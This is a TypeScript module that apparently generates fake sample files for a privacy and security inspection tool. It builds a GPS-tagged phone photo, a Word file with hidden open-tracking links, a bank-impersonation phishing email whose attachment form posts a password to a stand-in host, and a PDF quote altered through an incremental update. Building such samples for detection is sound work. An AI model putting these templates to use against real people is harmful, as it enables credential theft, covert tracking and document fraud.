// 範例頁（src/ui/SamplesPage.tsx）的檔案，按下按鈕時才在瀏覽器裡產生，不放進 repo。
// 內容都是假的：人名、帳號是虛構的，網域用 example.*，IP 用保留給文件的位址。
// 每一份都做成讀者實際會遇到的樣子，讓對應的工具有東西可以找。

import { PDFDocument, PDFName, type PDFRef } from "pdf-lib";
import { writeZip } from "../../core/zip.ts";
import { buildTiff, exifSegment, insertIntoJpeg } from "./exif.ts";

const enc = new TextEncoder();

// 帶拍攝位置的手機照片：在 canvas 畫好的 JPEG（src/ui/samples.ts）插進 EXIF。
// 位置是台北 101 附近（公開的地標），手機型號、時間與時區照 iPhone 的寫法
export function withPhoneExif(jpeg: Uint8Array): Uint8Array {
  const tiff = buildTiff({
    ifd0: [
      { tag: 0x010f, type: 2, value: "Apple" },
      { tag: 0x0110, type: 2, value: "iPhone 15 Pro" },
      { tag: 0x0112, type: 3, value: [1] },
      { tag: 0x0131, type: 2, value: "17.6.1" },
      { tag: 0x0132, type: 2, value: "2026:10:18 14:32:05" },
    ],
    exif: [
      { tag: 0x9003, type: 2, value: "2026:10:18 14:32:05" },
      { tag: 0x9004, type: 2, value: "2026:10:18 14:32:05" },
      { tag: 0x9011, type: 2, value: "+08:00" },
      { tag: 0xa433, type: 2, value: "Apple" },
      { tag: 0xa434, type: 2, value: "iPhone 15 Pro back triple camera 6.765mm f/1.78" },
    ],
    gps: [
      { tag: 0x0001, type: 2, value: "N" },
      { tag: 0x0002, type: 5, value: [25, 1, 2, 1, 20, 10] }, // 25°2'2.0"
      { tag: 0x0003, type: 2, value: "E" },
      { tag: 0x0004, type: 5, value: [121, 1, 33, 1, 520, 10] }, // 121°33'52.0"
      { tag: 0x0007, type: 5, value: [6, 1, 32, 1, 5, 1] }, // UTC 06:32:05
      { tag: 0x001d, type: 2, value: "2026:10:18" },
    ],
  });
  return insertIntoJpeg(jpeg, exifSegment(tiff));
}

const xml = (text: string) => enc.encode(`<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n${text}`);
const RELS = 'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"';
const T = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
const paragraph = (text: string) => `<w:p><w:r><w:t xml:space="preserve">${text}</w:t></w:r></w:p>`;

// 打開時會連線的 Word：內文是一般的會議通知，檔案裡藏著遠端範本、外部圖片與
// INCLUDEPICTURE 欄位，Word 一打開就連到 tracker.example.net，寄件的人知道誰在什麼時候打開
export async function trackedDocx(): Promise<Uint8Array> {
  const body = [
    paragraph("各位夥伴好："),
    paragraph("下週三的讀書會改到線上舉行，時間不變。請在週一前填好附件的報名表，回覆給我。"),
    paragraph("謝謝！"),
    // 看不見的追蹤圖片：欄位的指令拆成兩段，畫面上什麼都不會顯示
    `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDEPICTURE "https://tracker.example.net/</w:instrText></w:r><w:r><w:instrText>open.png?u=7f3a" \\d </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`,
  ].join("");
  return writeZip(
    Object.entries({
      "[Content_Types].xml": xml(
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/></Types>',
      ),
      "_rels/.rels": xml(`<Relationships ${RELS}><Relationship Id="rId1" Type="${T}/officeDocument" Target="word/document.xml"/></Relationships>`),
      "word/document.xml": xml(`<w:document ${W}><w:body>${body}</w:body></w:document>`),
      "word/_rels/document.xml.rels": xml(
        `<Relationships ${RELS}>` +
          `<Relationship Id="rId2" Type="${T}/image" Target="https://cdn.tracker.example.net/logo.png?u=7f3a" TargetMode="External"/>` +
          `<Relationship Id="rId3" Type="${T}/hyperlink" Target="https://forms.example.org/signup" TargetMode="External"/>` +
          `<Relationship Id="rId4" Type="${T}/settings" Target="settings.xml"/>` +
          "</Relationships>",
      ),
      "word/settings.xml": xml(`<w:settings ${W}><w:attachedTemplate r:id="rId1" xmlns:r="${T}"/></w:settings>`),
      "word/_rels/settings.xml.rels": xml(
        `<Relationships ${RELS}><Relationship Id="rId1" Type="${T}/attachedTemplate" Target="https://tracker.example.net/template.dotx?u=7f3a" TargetMode="External"/></Relationships>`,
      ),
    }).map(([name, data]) => ({ name, data, compress: true })),
  );
}

const base64 = (text: string) => {
  let bin = "";
  for (const b of enc.encode(text)) bin += String.fromCharCode(b);
  return btoa(bin);
};
// 內文的 base64 每 76 個字元換一行
const b64 = (text: string) => base64(text).replace(/.{76}/g, "$&\r\n");

// 標頭裡的中文寫成 =?UTF-8?B?…?=。一個編碼字最長 75 個字元，長的切成好幾個，
// 換行之後要縮排（折行），不然下一行會被當成新的標頭，整封信就認不出來
function encodedWord(text: string): string {
  const words: string[] = [];
  let chunk = "";
  for (const ch of text) {
    if (enc.encode(chunk + ch).length > 45) {
      words.push(chunk);
      chunk = "";
    }
    chunk += ch;
  }
  words.push(chunk);
  return words.map((w) => `=?UTF-8?B?${base64(w)}?=`).join("\r\n ");
}

// 冒充銀行的釣魚信：顯示名稱寫著像銀行的信箱，實際的寄件網域不同，SPF 與 DMARC 沒有通過，
// 回覆地址換成另一個網域，連結的文字跟實際的網址不同，附件是會要求登入的 HTML。
// 下面那一筆自稱通過的 Authentication-Results 是寄件的人自己寫的
export function phishingEmail(): Uint8Array {
  const html = [
    "<p>親愛的客戶您好：</p>",
    "<p>系統偵測到您的帳戶有異常登入，已暫時停用。請在 24 小時內點選下方連結完成身分驗證，逾期帳戶將被永久凍結。</p>",
    '<p><a href="https://secure-login.example.com/verify?id=88213">https://www.anxin-bank.example/verify</a></p>',
    "<p>安心銀行 客服中心</p>",
    '<img src="https://track.secure-login.example.com/open.gif?id=88213" width="1" height="1">',
  ].join("\n");
  const attachment = '<html><body><form action="https://secure-login.example.com/collect"><input name="password" type="password"></form></body></html>';
  return enc.encode(
    [
      "Authentication-Results: mx.example.net; spf=softfail smtp.mailfrom=alert@secure-login.example.com; dkim=none; dmarc=fail (p=NONE) header.from=secure-login.example.com",
      "Received: from unknown (HELO pc) ([198.51.100.7])",
      "        by mx.example.net with SMTP id k2; Sat, 17 Oct 2026 23:10:00 +0000",
      "Authentication-Results: fake.example.com; spf=pass; dkim=pass; dmarc=pass",
      `From: "${encodedWord("安心銀行 service@anxin-bank.example")}" <alert@secure-login.example.com>`,
      "Reply-To: verify@another-domain.example",
      "To: reader@example.net",
      `Subject: ${encodedWord("【重要】您的帳戶已暫停使用，請立即驗證")}`,
      "Date: Sun, 18 Oct 2026 07:10:00 +0800",
      "Message-ID: <88213@secure-login.example.com>",
      "MIME-Version: 1.0",
      'Content-Type: multipart/mixed; boundary="SAMPLE"',
      "",
      "--SAMPLE",
      "Content-Type: text/html; charset=utf-8",
      "Content-Transfer-Encoding: base64",
      "",
      b64(html),
      "--SAMPLE",
      `Content-Type: text/html; name="${encodedWord("帳戶驗證.html")}"`,
      `Content-Disposition: attachment; filename*=UTF-8''${encodeURIComponent("帳戶驗證.html")}`,
      "Content-Transfer-Encoding: base64",
      "",
      b64(attachment),
      "--SAMPLE--",
      "",
    ].join("\r\n"),
  );
}

const latin1 = (data: Uint8Array) => new TextDecoder("latin1").decode(data);

// 改過金額的報價單：用真正的增量更新做出兩個版本，第二版只在檔尾接上改過的頁面內容與
// 文件資訊，前面的位元組一個都不動，跟編輯軟體「儲存」時的做法相同。
// 標準字型沒有中文字，頁面內容用英文
const QUOTE = (total: string) =>
  [
    "BT /F1 20 Tf 50 330 Td (Quotation No. 2026-118) Tj ET",
    "BT /F1 12 Tf 50 300 Td (Client: Example Community Center) Tj ET",
    "BT /F1 12 Tf 50 270 Td (Item: Projector rental, 3 days) Tj ET",
    `BT /F1 16 Tf 50 230 Td (Total: NT$ ${total}) Tj ET`,
    "BT /F1 10 Tf 50 60 Td (Valid until 2026-11-30) Tj ET",
  ].join("\n");

export async function revisedPdf(): Promise<Uint8Array> {
  const doc = await PDFDocument.create({ updateMetadata: false });
  const ctx = doc.context;
  const font = ctx.register(ctx.obj({ Type: "Font", Subtype: "Type1", BaseFont: "Helvetica" }));
  const page = doc.addPage([420, 400]);
  page.node.set(PDFName.of("Resources"), ctx.obj({ Font: { F1: font } }));
  const content: PDFRef = ctx.register(ctx.stream(QUOTE("12,000")));
  page.node.set(PDFName.of("Contents"), content);
  doc.setTitle("Quotation 2026-118");
  doc.setAuthor("Chen Mei-Ling");
  doc.setCreator("Example Writer 3.1");
  doc.setCreationDate(new Date("2026-10-12T01:20:00Z"));
  const base = await doc.save({ useObjectStreams: false });

  const prev = [...latin1(base).matchAll(/startxref\s+(\d+)/g)].at(-1)![1]!;
  const root = ctx.trailerInfo.Root!.toString();
  const info = ctx.trailerInfo.Info as PDFRef;
  const after = QUOTE("92,000");
  const objects: [number, string][] = [
    [content.objectNumber, `<< /Length ${after.length} >>\nstream\n${after}\nendstream`],
    [info.objectNumber, "<< /Title (Quotation 2026-118) /Author (Chen Mei-Ling) /Creator (Example Writer 3.1) /CreationDate (D:20261012012000Z) /ModDate (D:20261016093000Z) >>"],
  ];
  let body = "\n";
  const offsets: [number, number][] = [];
  for (const [num, value] of objects) {
    offsets.push([num, base.length + enc.encode(body).length]);
    body += `${num} 0 obj\n${value}\nendobj\n`;
  }
  const xrefAt = base.length + enc.encode(body).length;
  let xref = "xref\n0 1\n0000000000 65535 f \n";
  for (const [num, at] of offsets.sort((a, b) => a[0] - b[0])) xref += `${num} 1\n${String(at).padStart(10, "0")} 00000 n \n`;
  const tail = `${xref}trailer\n<< /Size ${ctx.largestObjectNumber + 1} /Root ${root} /Info ${info.toString()} /Prev ${prev} >>\nstartxref\n${xrefAt}\n%%EOF\n`;
  const update = enc.encode(body + tail);
  const out = new Uint8Array(base.length + update.length);
  out.set(base);
  out.set(update, base.length);
  return out;
}
